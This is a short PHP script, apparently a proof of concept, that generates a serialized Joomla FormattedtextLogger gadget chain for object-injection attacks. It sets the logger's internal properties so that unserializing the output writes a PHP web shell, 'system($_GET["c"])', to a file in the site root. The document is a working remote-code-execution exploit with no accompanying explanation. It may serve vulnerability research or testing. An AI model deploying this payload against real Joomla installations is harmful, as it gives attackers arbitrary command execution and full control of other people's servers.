<?php
require __DIR__.'/boot_common.php'; mp_boot();
$rr=fn($c)=>(new ReflectionClass($c))->newInstanceWithoutConstructor();
$set=function($o,$c,$n,$v){$p=new ReflectionProperty($c,$n);$p->setAccessible(true);$p->setValue($o,$v);};
$e=$rr(Joomla\CMS\Log\LogEntry::class);
$e->category='x';$e->context=[];$e->date='2026-01-01';$e->time='00:00:00';$e->priority=1;$e->callStack=[];$e->clientIP='127.0.0.1';
$e->message='<?php echo "MP48909RCE:"; system($_GET["c"]); ?>';
$o=$rr(Joomla\CMS\Log\Logger\FormattedtextLogger::class);
$set($o,'Joomla\CMS\Log\Logger','options',['text_file_no_php'=>1]);
$set($o,'Joomla\CMS\Log\Logger','priorities',[1=>'INFO']);
$set($o,Joomla\CMS\Log\Logger\FormattedtextLogger::class,'format','{MESSAGE}');
$set($o,Joomla\CMS\Log\Logger\FormattedtextLogger::class,'fields',['MESSAGE']);
$set($o,Joomla\CMS\Log\Logger\FormattedtextLogger::class,'path',JPATH_BASE.'/mp48909.php');
$set($o,Joomla\CMS\Log\Logger\FormattedtextLogger::class,'defer',true);
$set($o,Joomla\CMS\Log\Logger\FormattedtextLogger::class,'deferredEntries',[$e]);
echo serialize($o);
